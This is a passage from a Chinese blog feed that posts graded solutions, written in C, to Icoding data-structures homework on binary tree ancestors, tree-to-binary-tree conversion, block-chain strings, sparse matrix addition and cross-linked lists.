  return false;</span><br><span class="line">    while (Tr || !is_empty(s)) &#123;</span><br><span class="line">        while (Tr) &#123;</span><br><span class="line">            push(s, Tr);</span><br><span class="line">            if (Tr &#x3D;&#x3D; node)</span><br><span class="line">                return true;</span><br><span class="line">            Tr &#x3D; Tr-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        top(s, &amp;Tr);</span><br><span class="line">        if (!Tr-&gt;right || Tr-&gt;right &#x3D;&#x3D; p) &#123;</span><br><span class="line">            p &#x3D; Tr;</span><br><span class="line">            pop(s, &amp;Tr);</span><br><span class="line">            Tr &#x3D; NULL;</span><br><span class="line">        &#125; else</span><br><span class="line">            Tr &#x3D; Tr-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>共同祖先<br>假设二叉树采用二叉链表方式存储， root指向根结点，p所指结点和q所指结点为二叉树中的两个结点，编写一个计算它们的最近的共同祖先，函数定义如下：</p><blockquote><p>BiTNode * nearest_ancestor(BiTree root, BiTNode *p, BiTNode *q);</p></blockquote><p>其中 root 指向二叉树的根结点，p 和 q 分别指向二叉树中的两个结点。<br>提示：在完成本题时，可利用 path 函数获取p和q两个结点到根结点之间的路径，之后再计算两条公共路径得出最近的共同祖先。path函数及栈相关定义如下：</p><blockquote><p>bool path(BiTNode* root, BiTNode* node, Stack* s);</p><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p><p>void init_stack(Stack <em>S); // 初始化栈<br>bool push(Stack</em> S, ElemType x); //x 入栈<br>bool pop(Stack* S, ElemType <em>px); //出栈，元素保存到px所指的单元，函数返回true,栈为空时返回 false<br>bool top(Stack</em> S, ElemType <em>px); //获取栈顶元素，将其保存到px所指的单元，函数返回true，栈满时返回 false<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:54:08</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BiTNode* nearest_ancestor(BiTree root, BiTNode* p, BiTNode* q)</span><br><span class="line">&#123;</span><br><span class="line">    Stack *pl, *ql;</span><br><span class="line">    pl &#x3D; malloc(sizeof(Stack));</span><br><span class="line">    ql &#x3D; malloc(sizeof(Stack));</span><br><span class="line">    init_stack(pl);</span><br><span class="line">    init_stack(ql);</span><br><span class="line">    if (path(root, p, pl) &#x3D;&#x3D; false || path(root, q, ql) &#x3D;&#x3D; false)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    ElemType temp;</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; pl-&gt;top &amp;&amp; i &lt; ql-&gt;top; i++) &#123;</span><br><span class="line">        if (pl-&gt;elem[i] !&#x3D; ql-&gt;elem[i])</span><br><span class="line">            break;</span><br><span class="line">        else</span><br><span class="line">            temp &#x3D; pl-&gt;elem[i];</span><br><span class="line">    &#125;</span><br><span class="line">    return temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h1><p>树转二叉树<br>使用队列，编写transfrom函数，将普通树转换成对应的二叉树。二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>普通树节点的定义如下：</p><blockquote><p>#define MAX_CHILDREN_NUM 5<br>struct _CSNode<br>{<br>    DataType data;<br>    struct _CSNode *children[MAX_CHILDREN_NUM];<br>};<br>typedef struct _CSNode CSNode;</p></blockquote><p>其中，子树的根节点的指针存放在children数组的前k个元素中，即如果children[i]的值为NULL，而children[i-1]不为NULL，则表明该结点只有i棵子树，子树根结点分别保存在children[0]至children[i-1]中。<br>队列相关定义及操作如下：</p><blockquote><p>struct __Queue<br>{<br>    int i, j; //指向数组内元素的游标<br>    void **array;<br>};<br>typedef struct __Queue Queue;</p><p>Queue* create_queue(); //创建队列<br>bool is_empty_queue(Queue <em>tree); //队为空返回true,不为空时返回false<br>void</em> del_queue(Queue *tree); //结点指针出队<br>void add_queue(Queue *tree, void *node); //结点指针入队<br>void free_queue(Queue *tree); //释放队列</p></blockquote><p>transform函数定义如下：</p><blockquote><p>BiTNode* transform(CSNode *root);</p></blockquote><p>其中 root 为普通树的根结点，函数返回该树对应二叉树的根结点。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:57:54</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BiTNode* transform(CSNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    if (root &#x3D;&#x3D; NULL)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    BiTree broot &#x3D; (BiTree)malloc(sizeof(struct Node));</span><br><span class="line">    broot-&gt;data &#x3D; root-&gt;data;</span><br><span class="line">    broot-&gt;left &#x3D; broot-&gt;right &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    Queue* queue &#x3D; create_queue();</span><br><span class="line">    Queue* bqueue &#x3D; create_queue();</span><br><span class="line">    add_queue(queue, root);</span><br><span class="line">    add_queue(bqueue, broot);</span><br><span class="line">    while (!is_empty_queue(queue)) &#123;</span><br><span class="line">        CSNode* node &#x3D; del_queue(queue);</span><br><span class="line">        BiTree bTreeNode &#x3D; del_queue(bqueue);</span><br><span class="line">        int i;</span><br><span class="line">        BiTree former &#x3D; NULL;</span><br><span class="line">        for (i &#x3D; 0; i &lt; MAX_CHILDREN_NUM; i++) &#123;</span><br><span class="line">            if (node-&gt;children[i]) &#123;</span><br><span class="line">                BiTree bnode &#x3D; (BiTree)malloc(sizeof(struct Node));</span><br><span class="line">                bnode-&gt;left &#x3D; bnode-&gt;right &#x3D; NULL;</span><br><span class="line">                bnode-&gt;data &#x3D; node-&gt;children[i]-&gt;data;</span><br><span class="line">                if (i &#x3D;&#x3D; 0)</span><br><span class="line">                    bTreeNode-&gt;left &#x3D; bnode;</span><br><span class="line">                else</span><br><span class="line">                    former-&gt;right &#x3D; bnode;</span><br><span class="line">                former &#x3D; bnode;</span><br><span class="line"></span><br><span class="line">                add_queue(queue, node-&gt;children[i]);</span><br><span class="line">                add_queue(bqueue, bnode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(queue-&gt;array);</span><br><span class="line">    free(queue);</span><br><span class="line">    free(bqueue-&gt;array);</span><br><span class="line">    free(bqueue);</span><br><span class="line">    return broot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 树 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第四次作业解析-块链串/数组</title>
      <link href="/post/716e4956.html"/>
      <url>/post/716e4956.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>块链串</li></ol><p>块链串定义如下：</p><blockquote><p>#define BLOCK_SIZE 4    // 可由用户定义的块大小<br>#define BLS_BLANK ‘#’   // 用于空白处的补齐字符</p><p>typedef struct _block {<br>    char ch[BLOCK_SIZE];    //块的数据域<br>    struct _block *next;    //块的指针域<br>} Block;</p><p>typedef struct {<br>    Block *head;        // 串的头指针<br>    Block *tail;        // 串的尾指针<br>    int len;            // 串的当前长度<br>} BLString;</p><p>//字符串初始化函数：<br>void blstr_init(BLString *T) {<br>    T-&gt;len = 0;<br>    T-&gt;head = NULL;<br>    T-&gt;tail = NULL;<br>}</p></blockquote><p>这些定义已包含在头文件 dsstring.h 中，请实现块链串的子串查找操作：</p><blockquote><p>bool blstr_substr(BLString src, int pos, int len, BLString *sub);<br>src为要查找的字符串<br>pos为子串开始的下标<br>len为子串的长度<br>sub在函数调用运行前指向一个已经初始化好的空串，在函数返回时，sub指向串src从第pos个字符起长度为len的子串<br>函数查找成功返回true，参数不正确返回 false </p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:05:30</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool blstr_substr(BLString src, int pos, int len, BLString* sub)</span><br><span class="line">&#123;</span><br><span class="line">    if (pos &lt; 0 || pos &gt;&#x3D; src.len || len &lt; 1)</span><br><span class="line">        return false;</span><br><span class="line">    Block *p &#x3D; (sub-&gt;head &#x3D; (Block*)malloc(sizeof(Block))), *q &#x3D; src.head;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    p-&gt;next &#x3D; NULL;</span><br><span class="line">    while (k &lt;&#x3D; pos + len - 1 &amp;&amp; q &amp;&amp; q-&gt;ch[i] !&#x3D; BLS_BLANK) &#123;</span><br><span class="line">        if (k &lt; pos) &#123;</span><br><span class="line">            if (i &lt; BLOCK_SIZE - 1)</span><br><span class="line">                i++;</span><br><span class="line">            else &#123;</span><br><span class="line">                q &#x3D; q-&gt;next;</span><br><span class="line">                i &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            p-&gt;ch[j] &#x3D; q-&gt;ch[i];</span><br><span class="line">            if (i &lt; BLOCK_SIZE - 1)</span><br><span class="line">                i++;</span><br><span class="line">            else &#123;</span><br><span class="line">                q &#x3D; q-&gt;next;</span><br><span class="line">                i &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            if (j &lt; BLOCK_SIZE - 1)</span><br><span class="line">                j++;</span><br><span class="line">            else &#123;</span><br><span class="line">                p-&gt;next &#x3D; (Block*)malloc(sizeof(Block));</span><br><span class="line">                p &#x3D; p-&gt;next;</span><br><span class="line">                p-&gt;next &#x3D; NULL;</span><br><span class="line">                j &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">            sub-&gt;len++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (j) &#123;</span><br><span class="line">        sub-&gt;tail &#x3D; p;</span><br><span class="line">        while (j &lt; BLOCK_SIZE)</span><br><span class="line">            p-&gt;ch[j++] &#x3D; BLS_BLANK;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        for (sub-&gt;tail &#x3D; sub-&gt;head; sub-&gt;tail-&gt;next !&#x3D; p; sub-&gt;tail &#x3D; sub-&gt;tail-&gt;next)</span><br><span class="line">            ;</span><br><span class="line">        sub-&gt;tail-&gt;next &#x3D; NULL;</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>矩阵加法<br>实现三元组表示的两个稀疏矩阵的加法。相关定义如下：<blockquote><p>#define MAXSIZE 100       //假设非零元个数的最大值为100<br>typedef struct {</p><pre><code>int i,j;   //非零元的行下标和列下标，i 和 j 从 1 开始计数，与数学中矩阵元素的编号一致ElemType e;    //非零元的值</code></pre><p>}Triple;</p><p>typedef struct {</p><pre><code>Triple data[MAXSIZE];     // 非零元三元组表int    m, n, len;     // 矩阵的行数、列数和非零元个数</code></pre><p>}TSMatrix;</p></blockquote></li></ol><p>在三元组中，i 和 j 从 1 开始计数，与数学中矩阵元素的编号一致<br>矩阵加法函数的原型为：</p><blockquote><p>bool add_matrix(const TSMatrix *pM, const TSMatrix *pN, TSMatrix *pQ);</p></blockquote><p>pM, pN, pQ 分别指向三个矩阵，当 pM 和 pN 两个矩阵不可加时，函数返回 false，否则函数返回 true，且 pQ 指向两个矩阵的和。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:10:16</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;tsmatrix.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool add_matrix(const TSMatrix* pM, const TSMatrix* pN, TSMatrix* pQ)</span><br><span class="line">&#123;</span><br><span class="line">    TSMatrix *M &#x3D; pM, *N &#x3D; pN, *Q &#x3D; pQ;</span><br><span class="line">    if (M-&gt;m !&#x3D; N-&gt;m || M-&gt;n !&#x3D; N-&gt;n) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    Q-&gt;m &#x3D; M-&gt;m, Q-&gt;n &#x3D; M-&gt;n, Q-&gt;len &#x3D; 0;</span><br><span class="line">    while (i &lt; M-&gt;len &amp;&amp; j &lt; N-&gt;len) &#123;</span><br><span class="line">        if (M-&gt;data[i].i &lt; N-&gt;data[j].i || (M-&gt;data[i].i &#x3D;&#x3D; N-&gt;data[j].i &amp;&amp; M-&gt;data[i].j &lt; N-&gt;data[j].j)) &#123;</span><br><span class="line">            Q-&gt;data[k].i &#x3D; M-&gt;data[i].i;</span><br><span class="line">            Q-&gt;data[k].j &#x3D; M-&gt;data[i].j;</span><br><span class="line">            Q-&gt;data[k].e &#x3D; M-&gt;data[i].e;</span><br><span class="line">            Q-&gt;len++, k++, i++;</span><br><span class="line">        &#125; else if (M-&gt;data[i].i &#x3D;&#x3D; N-&gt;data[j].i &amp;&amp; M-&gt;data[i].j &#x3D;&#x3D; N-&gt;data[j].j) &#123;</span><br><span class="line">            if (M-&gt;data[i].e + N-&gt;data[j].e) &#123;</span><br><span class="line">                Q-&gt;data[k].i &#x3D; M-&gt;data[i].i;</span><br><span class="line">                Q-&gt;data[k].j &#x3D; M-&gt;data[i].j;</span><br><span class="line">                Q-&gt;data[k].e &#x3D; M-&gt;data[i].e + N-&gt;data[j].e;</span><br><span class="line">                k++, Q-&gt;len++;</span><br><span class="line">            &#125;</span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Q-&gt;len++;</span><br><span class="line">            Q-&gt;data[k].i &#x3D; N-&gt;data[i].i;</span><br><span class="line">            Q-&gt;data[k].j &#x3D; N-&gt;data[i].j;</span><br><span class="line">            Q-&gt;data[k] &#x3D; N-&gt;data[j];</span><br><span class="line">            k++, j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while (i &lt; M-&gt;len) &#123;</span><br><span class="line">        Q-&gt;len++;</span><br><span class="line">        Q-&gt;data[k] &#x3D; M-&gt;data[i];</span><br><span class="line">        k++, i++;</span><br><span class="line">    &#125;</span><br><span class="line">    while (j &lt; N-&gt;len) &#123;</span><br><span class="line">        Q-&gt;len++;</span><br><span class="line">        Q-&gt;data[k] &#x3D; N-&gt;data[j];</span><br><span class="line">        k++, j++;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><ol><li>十字链表<br>十字链表相关定义如下：<blockquote><p>typedef int ElemType;</p><p>// 非零元素结点结构<br>typedef struct OLNode<br>{</p><pre><code>int row,col;ElemType value;struct OLNode *right,*down;</code></pre><p>}OLNode,*OLink;</p><p>// 十字链表结构<br>typedef struct<br>{</p><pre><code>OLink *rowhead,*colhead;int rows,cols,nums;</code></pre><p>}CrossList, *PCrossList;</p></blockquote></li></ol><p>1）实现十字链表的初始化操作：</p><blockquote><p>int init_cross_list(PCrossList L, const ElemType *A, int m, int n);</p></blockquote><p>其中 L 指向 CrossList 结构，且各成员已被初始化为0；<br>A 为 ElemType 类型数组中第一个元素的地址，元素的个数为 m×n 个，按行优先存储（即A[0] 为十字链表第1行第1列的元素；<br>A[1] 为第1行第2列的元素，A[n] 为第2行第1列的元素，A[n+1] 为第2行第2个元素）；<br>m 表示十字链表的行数，n 表示十字链表的列数。<br>init_cross_list 函数将 ElemType 数组中非0元素保存到十字链表中，函数返回非 0 元素的个数。</p><p>2）实现十字链表的删除操作：</p><blockquote><p>int del_cross_list(PCrossList L, ElemType k);</p></blockquote><p>其中 L 指向 要处理的 CrossList 结构，k 为要删除的元素；<br>del_cross_list 函数删除十字链表中所有值为 k 的结点，并返回删除结点的个数。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:15:09</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;crosslist.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int init_cross_list(PCrossList L, const ElemType* A, int m, int n)</span><br><span class="line">&#123;</span><br><span class="line">    OLNode *p, *q;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    L-&gt;rows &#x3D; m;</span><br><span class="line">    L-&gt;cols &#x3D; n;</span><br><span class="line">    L-&gt;nums &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    L-&gt;rowhead &#x3D; (OLink*)malloc((m + 1) * sizeof(OLNode));</span><br><span class="line">    for (j &#x3D; 0; j &lt;&#x3D; m; ++j) &#123;</span><br><span class="line">        L-&gt;rowhead[j] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;colhead &#x3D; (OLink*)malloc((n + 1) * sizeof(OLNode));</span><br><span class="line">    for (j &#x3D; 0; j &lt;&#x3D; n; ++j) &#123;</span><br><span class="line">        L-&gt;colhead[j] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    for (k &#x3D; 1; k &lt;&#x3D; m * n; ++k) &#123;</span><br><span class="line">        if (A[k - 1] !&#x3D; 0) &#123;</span><br><span class="line">            p &#x3D; (OLink)malloc(sizeof(OLNode));</span><br><span class="line">            p-&gt;row &#x3D; ((k - 1) &#x2F; n);</span><br><span class="line">            p-&gt;col &#x3D; k - (p-&gt;row * n) - 1;</span><br><span class="line">            p-&gt;value &#x3D; A[k - 1];</span><br><span class="line">            p-&gt;right &#x3D; NULL;</span><br><span class="line">            p-&gt;down &#x3D; NULL;</span><br><span class="line">            L-&gt;nums++;</span><br><span class="line">            i &#x3D; p-&gt;row;</span><br><span class="line">            if (L-&gt;rowhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                L-&gt;rowhead[i] &#x3D; p;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                for (q &#x3D; L-&gt;rowhead[i]; q-&gt;right &amp;&amp; q-&gt;right-&gt;col &lt; p-&gt;col; q &#x3D; q-&gt;right)</span><br><span class="line">                    ;</span><br><span class="line">                p-&gt;right &#x3D; q-&gt;right;</span><br><span class="line">                q-&gt;right &#x3D; p;</span><br><span class="line">            &#125;</span><br><span class="line">            i &#x3D; p-&gt;col;</span><br><span class="line">            if (L-&gt;colhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                L-&gt;colhead[i] &#x3D; p;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                for (q &#x3D; L-&gt;colhead[i]; q-&gt;down &amp;&amp; q-&gt;down-&gt;row &lt; p-&gt;row; q &#x3D; q-&gt;down)</span><br><span class="line">                    ;</span><br><span class="line">                p-&gt;down &#x3D; q-&gt;down;</span><br><span class="line">                q-&gt;down &#x3D; p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return L-&gt;nums;</span><br><span class="line">&#125;</span><br><span class="line">int del_cross_list(PCrossList L, ElemType k)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; 0, t &#x3D; 0;</span><br><span class="line">    OLink temp;</span><br><span class="line">    OLink p &#x3D; NULL;</span><br><span class="line">    OLink templeft &#x3D; NULL;</span><br><span class="line">    OLink tempup &#x3D; 